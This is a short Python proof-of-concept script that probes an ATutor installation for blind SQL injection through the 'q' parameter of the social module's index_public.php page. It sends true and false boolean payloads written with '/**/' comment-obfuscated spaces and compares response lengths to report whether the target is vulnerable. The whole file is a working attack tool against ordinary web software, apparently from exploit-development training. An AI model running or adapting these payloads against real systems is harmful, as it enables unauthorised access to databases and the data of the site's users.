import sys
import re
import requests
from bs4 import BeautifulSoup
from colorama import Fore, Back, Style

def fromat_text(title, item):
    cr = '\r\n'
    section_break = cr + "*" * 20 + cr
    item = str(item)
    text = Style.BRIGHT + Fore.RED + title + Fore.RESET + section_break + item + section_break
    return text

def searchFriends_sqli(ip, inj_str, query_type):
    target = "http://%s/atutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str)
    r = requests.get(target)
    content_lenght = int(r.headers['Content-Length'])
    if (query_type == True) and (content_lenght > 20):
        return True
    elif (query_type == False) and (content_lenght == 20):
        return True
    else:
        return False


def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <target> <injection_string>" % sys.argv[0])
        print("(+) eg: %s 192.168.121.103 \"aaa\"" % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]

    false_injection_string = "test')/**/or/**/(select/**/1)=0%23"
    true_injection_string = "test')/**/or/**/(select/**/1)=1%23"
    #injection_string = sys.argv[2]

    if searchFriends_sqli(ip, true_injection_string, True):
        if searchFriends_sqli(ip, false_injection_string, False):
            print("(+) the target is vulnerable!")

if __name__ == "__main__":
    main()
